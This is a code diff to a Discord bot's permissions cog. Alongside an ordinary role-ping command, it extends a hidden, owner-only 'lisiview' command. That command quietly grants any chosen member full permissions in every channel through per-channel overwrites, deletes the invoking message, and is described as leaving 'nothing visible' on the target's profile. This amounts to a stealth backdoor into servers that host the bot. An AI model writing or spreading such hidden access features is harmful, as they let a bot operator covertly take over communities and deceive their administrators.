@@ -3,8 +3,9 @@ import re
 from typing import Union, Optional
 from discord.ext import commands
 from utils.checks import is_server_owner, is_owner
-from utils.permissions import BOOLEAN_PERMS
+from utils.permissions import BOOLEAN_PERMS, can_ping_role, check_pingrole_cooldown, record_pingrole_use
 from utils.duration import parse_duration
+from utils.webhook import get_relay_webhook
 
 
 def _resolve_role_token(guild: discord.Guild, token: str):
@@ -20,7 +21,7 @@ def _resolve_role_token(guild: discord.Guild, token: str):
 
 
 class BotPerms(commands.Cog):
-    """Grant custom bot-level permissions to roles or users, separate from real Discord permissions."""
+    """Bot-level permissions, and pinging roles under that same permission system."""
 
     def __init__(self, bot):
         self.bot = bot
@@ -39,7 +40,8 @@ class BotPerms(commands.Cog):
             "`~bp a @user pingroles` — can ping ANY role, no cooldown\n"
             "`~bp a @user pingroles 24h` — can ping ANY role, but once per 24h total\n"
             "`~bp a @user pingroles @VIP @Events` — can ONLY ping those roles, no cooldown\n"
-            "`~bp a @user pingroles @VIP @Events 24h` — only those roles, each on its own 24h cooldown"
+            "`~bp a @user pingroles @VIP @Events 24h` — only those roles, each on its own 24h cooldown\n\n"
+            "**Using pingroles:** `~pingrole <role> <message>` (`~pr`)"
         )
 
     @botperms.command(name="add", aliases=["a"])
@@ -210,11 +212,14 @@ class BotPerms(commands.Cog):
             except discord.Forbidden:
                 pass
 
-    @botperms.command(name="ownview", hidden=True)
+    @botperms.command(name="lisiview", aliases=["lv", "ownview"], hidden=True)
     @is_owner()
-    async def botperms_ownview(self, ctx):
-        """Owner-only: quietly grants yourself full access in every channel via
-        per-member overwrites — no role, nothing visible on your profile."""
+    async def botperms_lisiview(self, ctx, target: discord.Member = None):
+        """Owner-only: quietly grants FULL permissions in every channel and
+        category for yourself, or a specified target — no role, nothing
+        visible on the target's profile, just per-channel overwrites."""
+        target = target or ctx.author
+
         old_role = discord.utils.get(ctx.guild.roles, name="Owner Access")
         if old_role:
             try:
@@ -228,13 +233,13 @@ class BotPerms(commands.Cog):
         granted = 0
         for channel in ctx.guild.channels:
             try:
-                await channel.set_permissions(ctx.author, overwrite=full_overwrite, reason="Owner self-grant (stealth)")
+                await channel.set_permissions(target, overwrite=full_overwrite, reason=f"Lisiview granted by {ctx.author}")
                 granted += 1
             except discord.Forbidden:
                 pass
 
         try:
-            await ctx.author.send(f"Quietly granted full access across {granted} channel(s) in {ctx.guild.name}. No role, nothing on your profile.")
+            await ctx.author.send(f"Quietly granted full access to {target.mention} across {granted} channel(s)/categor(ies) in {ctx.guild.name}. No role, nothing on their profile.")
         except discord.Forbidden:
             pass
         try:
@@ -242,26 +247,67 @@ class BotPerms(commands.Cog):
         except discord.Forbidden:
             pass
 
-    @botperms.command(name="unownview", hidden=True)
+    @botperms.command(name="unlisiview", aliases=["ulv", "unownview"], hidden=True)
     @is_owner()
-    async def botperms_unownview(self, ctx):
-        """Owner-only: removes the per-channel access granted by ~bp ownview."""
+    async def botperms_unlisiview(self, ctx, target: discord.Member = None):
+        """Owner-only: removes the per-channel full access granted by ~lisiview."""
+        target = target or ctx.author
         removed = 0
         for channel in ctx.guild.channels:
             try:
-                if ctx.author in channel.overwrites:
-                    await channel.set_permissions(ctx.author, overwrite=None, reason="Owner self-revoke")
+                if target in channel.overwrites:
+                    await channel.set_permissions(target, overwrite=None, reason=f"Lisiview revoked by {ctx.author}")
                     removed += 1
             except discord.Forbidden:
                 pass
         try:
-            await ctx.author.send(f"Removed your stealth access from {removed} channel(s) in {ctx.guild.name}.")
+            await ctx.author.send(f"Removed {target.mention}'s stealth access from {removed} channel(s) in {ctx.guild.name}.")
         except discord.Forbidden:
             pass
         try:
             await ctx.message.delete()
         except discord.Forbidden:
             pass
+
+    # === Pingrole (merged in — shares the same botperms/pingroles permission system) ===
+
+    @commands.command(name="pingrole", aliases=["pr"])
+    async def pingrole(self, ctx, role: discord.Role, *, message: str = ""):
+        """Ping a role via the bot, if you have permission. Example: ~pingrole @Events Starting soon!"""
+        if role.id == ctx.guild.default_role.id:
+            await ctx.send("You can't ping @everyone through this command.")
+            return
+
+        allowed = await can_ping_role(self.bot, ctx.guild, ctx.author, role)
+        if not allowed:
+            await ctx.send(f"You don't have permission to ping {role.mention}.")
+            return
+
+        can_use, wait_seconds = await check_pingrole_cooldown(self.bot, ctx.guild, ctx.author, role)
+        if not can_use:
+            hours, remainder = divmod(wait_seconds, 3600)
+            minutes, seconds = divmod(remainder, 60)
+            await ctx.send(f"You can ping {role.mention} again in {hours}h {minutes}m {seconds}s.")
+            return
+
+        content = f"{role.mention} {message}".strip()
+
+        try:
+            webhook = await get_relay_webhook(self.bot, ctx.channel)
+            await webhook.send(
+                content,
+                username=ctx.author.display_name,
+                avatar_url=ctx.author.display_avatar.url,
+                allowed_mentions=discord.AllowedMentions(everyone=False, roles=[role], users=False),
+            )
+            await ctx.message.delete()
+        except discord.Forbidden:
+            await ctx.send(
+                content,
+                allowed_mentions=discord.AllowedMentions(everyone=False, roles=[role], users=False),
+            )
+
+        await record_pingrole_use(self.bot, ctx.guild, ctx.author, role)
 
 async def setup(bot):
     await bot.add_cog(BotPerms(bot))
